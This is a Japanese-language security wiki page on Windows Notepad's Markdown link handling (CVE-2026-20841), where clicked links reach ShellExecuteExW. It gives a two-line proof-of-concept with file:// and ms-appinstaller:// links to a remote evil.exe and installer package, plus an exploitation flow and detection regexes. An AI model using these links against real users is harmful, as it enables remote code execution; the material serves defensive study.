# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown や HTML をレンダリングする Windows アプリケーションは、クリックされたリンク先を `ShellExecuteExW` に渡す場合があります。ShellExecute は登録済みの URI scheme と file association をディスパッチするため、レンダラーはすべてのリンクが HTTP(S) だと想定せず、明示的な allowlist を設ける必要があります。以下で説明する Notepad の動作は CVE-2026-20841 に関するものであり、すべてのレンダラーに当てはまるものではありません。<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad の Markdown mode における ShellExecuteExW の攻撃対象面
- Notepad は `sub_1400ED5D0()` 内の固定文字列比較により、`.md` 拡張子の場合に限って Markdown mode を選択します。<sup>[[1]](#references)</sup>
- 対応する Markdown link:
  - 標準形式: `[text](target)`
  - Autolink: `<target>`（`[target](target)` としてレンダリングされる）。そのため、payload と検出では両方の構文を考慮する必要があります。
- リンクのクリックは `sub_140170F60()` で処理されます。この関数は不十分なフィルタリングを行った後、`ShellExecuteExW` を呼び出します。
- `ShellExecuteExW` は HTTP(S) だけでなく、**設定済みのあらゆる protocol handler** にディスパッチします。<sup>[[1]](#references)</sup>

### Payload に関する考慮事項
- リンク内の `\\` は `ShellExecuteExW` に渡される前に `\` に**正規化**されるため、UNC/path の作成と検出に影響します。
- `.md` ファイルはデフォルトでは Notepad に関連付けられていません。被害者がファイルを Notepad で開いてリンクをクリックする必要がありますが、レンダリング後はリンクをクリックできます。
- 危険な scheme の例:<sup>[[1]](#references)</sup>
  - `file://` でローカル/UNC payload を起動する。
  - `ms-appinstaller://` で App Installer のフローをトリガーする。ローカルに登録された他の scheme も悪用される可能性があります。

### 最小限の PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Exploitation flow
1. NotepadでMarkdownとして表示されるように **`.md` ファイル** を作成する。
2. 危険なURIスキーム（`file:`、`ms-appinstaller:`、またはインストール済みのハンドラー）を使ったリンクを埋め込む。
3. ファイルを（HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMBなどで）送信し、ユーザーにNotepadで開かせる。
4. クリックすると、**正規化されたリンク** が `ShellExecuteExW` に渡され、対応するプロトコルハンドラーがユーザーのコンテキストで参照先のコンテンツを実行する。<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- 文書の配信によく使われるポート／プロトコル（`20/21 (FTP)`、`80 (HTTP)`、`443 (HTTPS)`、`110 (POP3)`、`143 (IMAP)`、`25/587 (SMTP)`、`139/445 (SMB/CIFS)`、`2049 (NFS)`、`111 (portmap)`）を経由する `.md` ファイルの転送を監視する。
- Markdownリンク（標準形式とオートリンク）を解析し、**大文字と小文字を区別せず** `file:` または `ms-appinstaller:` を探す。
- リモートリソースへのアクセスを検出するため、ベンダー推奨の正規表現を使用する:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDIが説明しているベンダー修正では、許可される対象をローカルファイルとHTTP(S)に限定しています。登録されている攻撃対象領域はシステムによって異なるため、必要に応じて他のインストール済みプロトコルハンドラーも検出対象に追加してください。<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841：Windowsメモ帳における任意コード実行](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
